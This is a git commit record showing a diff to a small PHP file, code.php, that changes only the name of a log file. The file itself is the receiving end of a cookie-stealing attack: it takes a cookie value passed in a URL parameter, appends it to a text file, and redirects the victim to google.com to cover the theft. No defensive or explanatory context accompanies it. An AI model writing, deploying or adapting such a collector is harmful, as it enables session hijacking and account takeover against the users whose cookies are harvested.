7b2d2a76a230a31daa01f2db121070feed26398d
dkagrawal <dishank.agrawal123@gmail.com>
2015-03-23 12:01:24 +0530

    Update code.php

--- code.php
+++ code.php
@@ -1,7 +1,7 @@
 <?php
 
 $cookie = $HTTP_GET_VARS[" c"]; 
-$file = fopen('cookielog.txt', 'a'); 
+$file = fopen('cookie.txt', 'a'); 
 fwrite($file, $cookie . "\n\n"); 
 echo " <script>location.href='http://www.google.com';</script>";
 
